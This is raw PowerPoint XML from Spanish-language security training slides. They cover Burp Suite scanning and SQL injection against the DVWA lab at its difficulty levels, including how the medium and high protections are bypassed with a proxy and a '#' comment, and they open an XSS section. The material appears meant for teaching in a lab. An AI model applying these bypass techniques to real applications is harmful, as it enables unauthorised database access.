              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>scan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> automático</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D7453E30-2529-E35E-A61E-C2CFD88EFD9A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8003355" y="628457"/>
            <a:ext cx="3184269" cy="1988188"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Marcador de texto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{62B89D9B-C003-1662-3C82-3CBD7280E2B7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="605009" y="1064753"/>
            <a:ext cx="6597069" cy="50720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342900" lvl="0" indent="-342900" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="7095CA"/>
              </a:buClr>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>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La versión </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>profesional</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de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Burp</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Suite posee la opción de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Scan</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para analizar posibles vectores de ataque</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="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En el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>siguiente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> enlace se puede encontrar más información</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="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Una vez realizado el escáner, se puede ver el resultado en la pestaña de target/Site </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0" err="1">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Map</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1800" dirty="0">
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" indent="-342900" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="7095CA"/>
              </a:buClr>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>En el </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>siguiente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> video se puede ver una demostración</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="0" indent="-342900" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="7095CA"/>
              </a:buClr>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectángulo: esquinas redondeadas 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7A60130D-D84C-E7E6-2791-16660C88D95F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9181707" y="1064753"/>
            <a:ext cx="1197204" cy="50009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 name="Imagen 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B43EEC86-0AB3-7B6F-ADA1-50412F6C5EED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6526561" y="3052941"/>
            <a:ext cx="4778293" cy="3296597"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8143428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8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL defensa</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="CuadroTexto 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FD915C23-6E6F-48C1-9533-198B5444AED4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="839416" y="1165535"/>
            <a:ext cx="568489" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Low</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{237D5F25-2F2A-BA9D-BD2F-959ADFF1418B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2432116" y="1467430"/>
            <a:ext cx="7600050" cy="4902120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31431524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8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL defensa</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Imagen 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7CD75F51-6B5A-4115-A097-99B623A2A8C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1652459" y="3616516"/>
            <a:ext cx="7859222" cy="1419423"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="CuadroTexto 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FD915C23-6E6F-48C1-9533-198B5444AED4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="839416" y="1165535"/>
            <a:ext cx="813043" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Medio</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="CuadroTexto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D2EDE9F8-0729-71C1-7925-26E65EBDC3B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2038545" y="1717383"/>
            <a:ext cx="9047375" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>La defensa media los posibles valores a escoger están en un desplegable y no es un campo libre de texto. Para romper esta protección podemos usar cualquier proxy como </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>BurpSuite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> e incluso la opción de “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>inspecionar</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>” del propio navegador para modificar el valor del desplegable</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24278728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8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL defensa</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="CuadroTexto 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FD915C23-6E6F-48C1-9533-198B5444AED4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="839416" y="1165535"/>
            <a:ext cx="612668" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>High</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="CuadroTexto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{16E503B7-FDA0-EF2B-B895-7029C03DAA8E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1145749" y="1784817"/>
            <a:ext cx="10354951" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>En la defensa elevada usamos el “LIMIT 1” para que solo devuelva un resultado, pero al colocar al final del ataque el “#” hace que el resto del comando SQL se ignore y, por lo tanto, la limitación de la consulta deje de funcionar y se logra el ataque.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Imagen 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7E822B1-657E-512F-D1B9-9AA35C2D1E18}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2479698" y="2887144"/>
            <a:ext cx="7232603" cy="3566192"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4711229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8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL defensa</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="CuadroTexto 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AD58FD13-4544-4A4F-B37A-EE972922892A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="398609" y="1093033"/>
            <a:ext cx="1172116" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Imposible:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="CuadroTexto 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{93DF4246-1D5E-879A-7674-6CC955260739}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1887718" y="1093033"/>
            <a:ext cx="9650690" cy="1477328"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>En esta defensa se protege tanto a la inyección SQL usando parametrización, como a los ataques CSRF (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>cross</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>-site </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>request</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>forgery</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>) en donde el atacante se aprovecha que ya estas conectado en una aplicación (tu banco, por ejemplo) y te envía un enlace a una aplicación maliciosa que aprovecha el echo de que ya estés conectado a tu banco.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Para defenderse del CSRF se usa el validador del Token (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>checkToken</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Imagen 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2D2DD4F5-8A64-8B30-CB5C-6EE5E61AA002}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2837466" y="2614329"/>
            <a:ext cx="7058557" cy="3905249"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3987938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ítulo 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1671070" y="2492067"/>
            <a:ext cx="8208838" cy="936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 altLang="es-ES" sz="5000" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Inyección XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39850756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27991" y="109434"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Inyección XSS</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="752197" y="1749909"/>
            <a:ext cx="9343950" cy="21999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514350" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" b="1" dirty="0"/>
              <a:t>Reflejado</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>son aquellos en los que el script inyectado se incluye dentro de la URL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0"/>
              <a:t> (se combina con ingeniería social)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="es-ES" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4FEA0560-2047-4057-CBFA-1EDB40E22FF8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="511405" y="993235"/>
            <a:ext cx="10140884" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1800" dirty="0">
                <a:solidFill>
